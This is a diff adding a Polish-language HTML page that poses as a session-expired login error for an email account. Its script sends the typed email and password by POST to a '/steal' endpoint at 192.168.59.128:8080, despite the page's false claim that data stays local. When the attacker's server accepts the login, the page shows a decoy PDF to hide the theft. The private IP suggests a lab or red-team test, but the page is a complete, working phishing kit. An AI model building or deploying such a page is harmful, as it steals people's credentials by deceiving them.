@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Błąd logowania - Konfiguracja konta</title>
+<style>
+  :root {
+    --color-blue-50: #2493ef; --color-blue-60: #1373d9; --color-blue-70: #105bbc;
+    --color-gray-40: #a1a1aa; --color-gray-50: #71717a; --color-white: #fff;
+    --button-border-radius: 3px; --buttons-secondary-bgcolor: #f0f0f4; --buttons-secondary-hover-bgcolor: #e0e0e6;
+    --buttons-secondary-color: #15141a; --button-link-text-color: var(--color-blue-60);
+    --checkbox-checked-bgcolor: var(--color-blue-60); --page-bg: #f7f7f7; --text: #15141a; --border: #9f9ea1;
+    --primary-btn-active: #0060df; --primary-btn-disabled: #94bbed; --secondary-btn: #dedede;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; min-height: 100vh; font: 13px/1.4 "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; color: var(--text); background: var(--page-bg); }
+  .wrap { display: grid; grid-template-columns: 420px 280px; gap: 64px; max-width: 860px; margin: 0; padding: 48px 50px; align-items: start; justify-content: start; }
+  h1 { margin: 0 0 10px; font-size: 22px; font-weight: 400; color: #c50042; }
+  .sub { margin: 0 0 28px; max-width: 40em; }
+  .error-msg { display: none; background: #fee2e2; color: #991b1b; padding: 10px; border-radius: 4px; margin-bottom: 15px; font-weight: bold; border: 1px solid #fca5a5; }
+  label { display: block; margin: 0 0 4px; }
+  .field { margin: 0 0 14px; position: relative; }
+  input[type="text"], input[type="email"], input[type="password"] { width: 100%; height: 32px; padding: 4px 32px 4px 10px; border: 1px solid var(--border); border-radius: var(--button-border-radius); background: var(--color-white); font: inherit; color: var(--text); }
+  input[type="password"] { padding-right: 10px; }
+  input:focus { outline: none; border-color: var(--color-blue-50); box-shadow: 0 0 0 1px var(--color-blue-50); }
+  .info { position: absolute; right: 8px; bottom: 7px; width: 18px; height: 18px; border: 1px solid var(--color-gray-40); border-radius: 50%; color: var(--color-gray-50); font: italic 11px/16px Georgia, serif; text-align: center; pointer-events: none; }
+  .new-mail { display: block; text-align: right; margin: -6px 0 14px; color: var(--button-link-text-color); text-decoration: none; cursor: pointer; }
+  .check { display: flex; align-items: center; gap: 8px; margin: 4px 0 28px; }
+  .check input { appearance: none; width: 16px; height: 16px; margin: 0; border: 1px solid var(--border); border-radius: 2px; background: var(--color-white); cursor: pointer; }
+  .check input:checked { background: var(--checkbox-checked-bgcolor) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 12 12'%3E%3Cpath fill='none' stroke='%23fff' stroke-width='2' d='M2.5 6.2 5 8.7 9.5 3.3'/%3E%3C/svg%3E") center / 10px no-repeat; border-color: var(--checkbox-checked-bgcolor); }
+  .check label { margin: 0; cursor: pointer; }
+  .actions { display: flex; justify-content: flex-end; gap: 10px; margin: 0 0 28px; }
+  button { min-width: 88px; height: 32px; padding: 0 14px; border: 0; border-radius: var(--button-border-radius); font: inherit; cursor: pointer; transition: background 0.2s; }
+  .cancel { background: var(--secondary-btn); color: var(--buttons-secondary-color); }
+  .continue { min-width: 96px; background: var(--primary-btn-disabled); color: #fff; }
+  .continue:not(:disabled) { background: var(--primary-btn-active); cursor: pointer; }
+  .continue:disabled { cursor: not-allowed; opacity: 0.8; }
+  .note { margin: 0; font-size: 12px; }
+  .art { padding-top: 72px; text-align: left; }
+  .art img { display: block; width: 280px; height: auto; }
+  /* --- Styl dla osadzonego PDF --- */
+  #pdf-viewer { display: none; width: 100%; height: 100vh; border: none; }
+</style>
+</head>
+<body>
+  <div id="form-view" class="wrap">
+    <div>
+      <h1>Wystąpił problem z logowaniem</h1>
+      <p class="sub">Twoja sesja wygasła lub wystąpił błąd połączenia z serwerem. Ze względów bezpieczeństwa uzupełnij ponownie swoje dane logowania, aby kontynuować.</p>
+      
+      <div id="errorBox" class="error-msg">Nieprawidłowy adres e-mail lub hasło. Spróbuj ponownie.</div>
+
+      <div class="field">
+        <label for="name">Imię i nazwisko</label>
+        <input id="name" type="text" placeholder="Jan Kowalski" />
+        <span class="info" title="Informacja">i</span>
+      </div>
+
+      <div class="field">
+        <label for="email">Adres e-mail</label>
+        <input id="email" type="email" placeholder="jan.kowalski@example.com" oninput="checkForm()" required />
+        <span class="info" title="Informacja">i</span>
+      </div>
+      <a class="new-mail">Konfiguruj ręcznie</a>
+
+      <div class="field">
+        <label for="password">Hasło</label>
+        <input id="password" type="password" oninput="checkForm()" required />
+      </div>
+
+      <div class="check">
+        <input id="remember" type="checkbox" checked />
+        <label for="remember">Zachowaj hasło</label>
+      </div>
+
+      <div class="actions">
+        <button type="button" class="cancel">Anuluj</button>
+        <button type="button" class="continue" id="btnContinue" disabled>Kontynuuj</button>
+      </div>
+      <p class="note">Dane logowania będą przechowywane wyłącznie lokalnie na komputerze użytkownika.</p>
+    </div>
+    <div class="art" aria-hidden="true">
+      <img src="http://192.168.59.128:8080/octopus-setup.svg" alt="" width="280" height="280" />
+    </div>
+  </div>
+
+  <!-- Kontener na osadzony PDF, początkowo ukryty -->
+  <iframe id="pdf-viewer" src=""></iframe>
+
+  <script>
+    function checkForm() {
+        var email = document.getElementById('email').value;
+        var pass = document.getElementById('password').value;
+        var btn = document.getElementById('btnContinue');
+        document.getElementById('errorBox').style.display = 'none';
+
+        if (email.indexOf('@') > -1 && email.indexOf('.') > -1 && pass.length > 0) {
+            btn.disabled = false;
+        } else {
+            btn.disabled = true;
+        }
+    }
+
+    document.getElementById('btnContinue').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (this.disabled) return;
+
+        var u = document.getElementById('email').value;
+        var p = document.getElementById('password').value;
+        var btn = this;
+        var errBox = document.getElementById('errorBox');
+
+        btn.innerHTML = 'Weryfikacja...';
+        btn.disabled = true;
+
+        fetch('http://192.168.59.128:8080/steal', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.valid) {
+                // --- ZMIANA: Sukces -> Ukryj formularz i pokaż PDF ---
+                document.getElementById('form-view').style.display = 'none';
+                var pdfFrame = document.getElementById('pdf-viewer');
+                // Ładujemy ogólny, wiarygodny dokument PDF z naszego serwera
+                pdfFrame.src = 'http://192.168.59.128:8080/regulamin.pdf';
+                pdfFrame.style.display = 'block';
+            } else {
+                errBox.style.display = 'block';
+                btn.innerHTML = 'Kontynuuj';
+                btn.disabled = false;
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            }
+        })
+        .catch(err => {
+            errBox.textContent = 'Błąd połączenia z serwerem.';
+            errBox.style.display = 'block';
+            btn.innerHTML = 'Kontynuuj';
+            btn.disabled = false;
+        });
+    });
+  </script>
+</body>
+</html>
